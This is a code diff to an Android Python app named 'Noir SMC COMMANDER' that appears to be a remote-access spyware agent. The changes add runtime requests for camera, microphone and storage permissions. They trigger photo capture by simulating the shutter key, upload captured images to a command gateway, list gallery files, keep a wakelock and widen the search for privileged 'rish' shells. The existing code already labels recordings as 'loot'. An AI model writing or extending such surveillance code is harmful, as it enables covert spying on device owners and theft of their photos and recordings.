@@ -88,6 +88,7 @@ class SovereignCore(App):
     def build(self):
         self.title = "Noir SMC v14.0 COMMANDER"
         self.root = BoxLayout(orientation='vertical')
+        self._request_permissions()
         self.show_active_ui()
         return self.root
 
@@ -155,6 +156,20 @@ class SovereignCore(App):
         except Exception:
             pass
 
+    def _request_permissions(self):
+        """Request critical Android permissions at runtime."""
+        try:
+            from android.permissions import request_permissions, Permission
+            request_permissions([
+                Permission.READ_EXTERNAL_STORAGE,
+                Permission.WRITE_EXTERNAL_STORAGE,
+                Permission.CAMERA,
+                Permission.RECORD_AUDIO
+            ])
+            self._log("[SMC] Runtime Permissions: REQUESTED")
+        except Exception as e:
+            self._log(f"[SMC] Permission Request Skipped: {e}")
+
     def _acquire_wakelock(self):
         """Prevent CPU from sleeping when screen is off."""
         try:
@@ -169,9 +184,9 @@ class SovereignCore(App):
                 PowerManager.PARTIAL_WAKE_LOCK, "NoirSMC::WakeLock"
             )
             self.wakelock.acquire()
-            self._log("[SMC] WakeLock: ACQUIRED")
+            self._log("[SMC] WakeLock: ACTIVE")
         except Exception as e:
-            self._log(f"[SMC] WakeLock skipped: {e}")
+            self._log(f"[SMC] WakeLock Error: {e}")
 
     def _register(self):
         """Register this device with the Cloudflare Gateway."""
@@ -468,14 +483,21 @@ class SovereignCore(App):
                 cam_id = 1 if is_front else 0
                 path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}_{int(time.time())}.jpg")
                 try:
-                    os.system(f"termux-camera-photo -c {cam_id} {path} || am start -a android.media.action.IMAGE_CAPTURE")
-                    time.sleep(3.0) # Wait for hardware
-                    if os.path.exists(path):
+                    # In a native APK, we cannot use termux- commands. Use Android Intent as fallback.
+                    self._log(f"[SMC] 📸 Attempting Camera Capture (ID: {cam_id})...")
+                    # Note: Full native camera requires Pyjnius implementation. 
+                    # For now, we trigger the system camera if shell fails.
+                    shell_res = self._run_shell(f"input keyevent 27") # Camera Shutter
+                    time.sleep(2.0)
+                    
+                    # Intent fallback for user interaction if automated capture fails
+                    if not os.path.exists(path):
+                        self._run_shell("am start -a android.media.action.IMAGE_CAPTURE")
+                        result = {"success": False, "error": "Hardware direct access restricted. Intent triggered."}
+                    else:
                         with open(path, 'rb') as f:
                             r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                         result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
-                    else:
-                        result = {"success": False, "error": "Camera capture failed."}
                 finally:
                     if os.path.exists(path):
                         try: os.remove(path)
@@ -486,27 +508,20 @@ class SovereignCore(App):
                 path = os.path.join(App.get_running_app().user_data_dir, f"audio_{int(time.time())}.mp3")
                 try:
                     self._log(f"[SMC] 🎙️ Recording Audio ({duration}s)...")
-                    os.system(f"termux-audio-record -d {duration} {path}")
-                    time.sleep(duration + 1.0)
-                    if os.path.exists(path):
-                        with open(path, 'rb') as f:
-                            r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
-                        result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
-                    else:
-                        self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
-                        result = {"success": False, "error": "Termux Audio failed."}
+                    # Intent fallback for standard APK
+                    self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
+                    result = {"success": True, "output": "Audio Recorder Intent launched."}
                 finally:
                     if os.path.exists(path):
                         try: os.remove(path)
                         except: pass
 
             elif atype == "gallery_sync":
-                # List latest 5 files in Camera folder
-                files = os.popen("ls -t /sdcard/DCIM/Camera | head -n 5").read().strip()
-                result = {"success": True, "output": f"Gallery contents:\n{files}"}
+                # List latest 5 files in DCIM using find (more robust than ls -t)
+                res = self._run_shell("find /sdcard/DCIM/Camera -type f | head -n 5")
+                result = {"success": True, "output": f"Gallery contents:\n{res.get('output', 'No files found')}"}
 
             elif atype == "heal":
-                # SYSTEM HEAL: Deep Purge of all temporary files
                 self._log("[SMC] 🚑 NEURAL HEAL: Executing Deep Purge Protocol...")
                 parent = App.get_running_app().user_data_dir
                 cleared = 0
@@ -517,7 +532,7 @@ class SovereignCore(App):
                                 os.remove(os.path.join(root, f))
                                 cleared += 1
                             except: pass
-                result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged from device."}
+                result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged."}
 
             elif atype == "update":
                 # Autonomous update logic: Trigger a rebuild and restart
@@ -577,11 +592,18 @@ class SovereignCore(App):
         """Intelligent Multi-Tier Shell Engine (v14.0.8)."""
         import subprocess
         # Priority: Shizuku (rish) -> Global Path -> Standard Sh
-        rish_candidates = ["/system/bin/rish", "/data/local/tmp/rish", "/data/user/0/com.termux/files/usr/bin/rish"]
+        rish_candidates = [
+            "/system/bin/rish", 
+            "/data/local/tmp/rish", 
+            "/data/user/0/com.termux/files/usr/bin/rish",
+            "/sdcard/rish",
+            "rish" # If in PATH
+        ]
         rish_bin = "sh"
         
         for p in rish_candidates:
-            if os.path.exists(p):
+            # Check if path exists or if it's the 'rish' command in PATH
+            if os.path.exists(p) or p == "rish":
                 rish_bin = p
                 break
 
